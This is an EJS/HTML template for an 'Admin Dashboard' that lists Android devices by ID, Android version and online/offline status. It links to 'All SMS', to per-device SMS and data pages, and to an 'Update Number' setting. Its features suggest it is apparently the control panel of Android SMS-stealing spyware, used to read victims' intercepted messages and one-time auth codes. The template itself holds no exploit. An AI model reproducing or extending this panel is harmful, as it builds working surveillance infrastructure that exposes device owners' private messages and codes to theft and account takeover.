<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Admin Dashboard</title>
  <link rel="stylesheet" href="/css/phon.css" />
</head>
<body>
  <nav class="header-nav">
    <div class="header-left">
      <div class="count-box" id="userCountBox">0</div>
    </div>

    <div class="header-admin-title"></div>

   <!-- ðŸ” Set Password Button -->
<button id="openSetPasswordModal" class="set-password-icon" title="Set Delete Password">
  Set Password
</button>


    <!-- ðŸ“ Moved Nav Links into Header -->
    <div class="nav-links-inline">
      <a href="/api/admin/settings">Update Number</a>
      <a href="/api/notification/sms-auth">All SMS</a>
      <a href="/api/auth/change-credentials">Change Password</a>
    </div>
  </nav>

    <button id="logoutAllButton" style="visibility: hidden; pointer-events: none;">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
        <path d="M502.6 233.4l-96-96c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9L402.1 224H192c-13.3 0-24 10.7-24 24s10.7 24 24 24h210.1l-29.4 29.4c-9.4 9.4-9.4 24.6 0 33.9s24.6 9.4 33.9 0l96-96c9.5-9.4 9.5-24.6 0-33.8zM320 80H80c-26.5 0-48 21.5-48 48v256c0 26.5 21.5 48 48 48h240c26.5 0 48-21.5 48-48v-48c0-13.3-10.7-24-24-24s-24 10.7-24 24v48c0 0.6-.4 1-1 1H81c-.6 0-1-0.4-1-1V129c0-.6.4-1 1-1h238c0.6 0 1 .4 1 1v49c0 13.3 10.7 24 24 24s24-10.7 24-24v-49c0-26.5-21.5-48-48-48z"/>
      </svg>
    </button>

 <div class="stats-box" id="statsBox">
  <div class="stats-card online" data-filter="online">
    <span class="stats-label"> Online</span>
    <span class="stats-value" id="onlineCount">0</span>
  </div>
  <div class="stats-card offline" data-filter="offline">
    <span class="stats-label"> Offline</span>
    <span class="stats-value" id="offlineCount">0</span>
  </div>
  <div class="stats-card all" data-filter="all">
    <span class="stats-label"> All Devices</span>
    <span class="stats-value" id="totalCount">0</span>
  </div>
</div>


<div class="dot">
  <div class="container" id="deviceContainer">
    <% 
      const sortedUsers = users.slice().sort((a, b) => {
        return new Date(b.createdAt || b._id.getTimestamp()) - new Date(a.createdAt || a._id.getTimestamp());
      });
      const total = sortedUsers.length;
      sortedUsers.forEach((user, idx) => {
        const name = user.userEntries?.[0]?.name || user.brand || "Unknown";
        const statusClass = user.connectivity === 'Online' ? 'status-online' : 'status-offline';
        const dataStatus = (user.connectivity || '').toString().trim().toLowerCase();
    %>
      <div class="device-card" data-id="<%= user.uniqueid %>" data-status="<%= dataStatus %>">
        <div class="delete-icon" title="Delete Device" data-id="<%= user.uniqueid %>">&#128465;</div>

        <div class="device-details">
  <h2>
    <%= name %>
    <br />
    <small style="font-weight: normal; font-size: 12px; color: #666; margin-top: 8px; color: black;  font-weight: bold;">
      Android Version: <%= user.androidVersion || 'N/A' %>
    </small>
  </h2>
  <p class="device-id"><strong>ID:</strong> <%= user.uniqueid %></p>
</div>

<!-- STATUS BOX -->
<!-- WRAPPER FLEX CONTAINER -->
<div class="device-row">

  <!-- STATUS BOX -->
  <div class="device-status <%= statusClass %>">
    <span class="status-text">Status â€“ <%= user.connectivity %></span>
  </div>

  <!-- ICONS + COUNT BOX -->
  <div class="device-icons">
    <a href="/api/notification/sms-auth-custom/<%= user._id %>" class="status-icons" title="Message">
      <img src="/image/message.png" alt="Message Icon" class="icon-img" />
    </a>

    <a href="/api/data/detail/<%= user._id %>" class="status-icons" title="Data">
      <img src="/image/data.png" alt="Data Icon" class="icon-img" />
    </a>

    <span class="data-count"><%= total - idx %></span>
  </div>

</div>


      </div>
    <% }) %>
  </div>
</div>
 
  <div id="deleteModal" class="modal hidden">
    <div class="modal-content">
      <h2>Enter Password to Delete</h2>
      <input type="password" id="deletePassword" placeholder="Enter Password" />
      <button id="confirmDeleteBtn">Confirm</button>
    </div>
  </div>
  
  <div id="setPasswordModal" class="modal hidden">
    <div class="modal-content">
      <h2>Set New Delete Password</h2>
      <input type="password" id="oldDeletePassword" placeholder="Current Password" />
      <input type="password" id="newDeletePassword" placeholder="New Password" />
      <button id="confirmSetBtn">Save Password</button>
    </div>
  </div>

  <!-- Scripts -->
  <script src="/socket.io/socket.io.js"></script>
  <script src="/js/script.js"></script>
  <script src="/js/logout.js"></script>
</body>
</html>
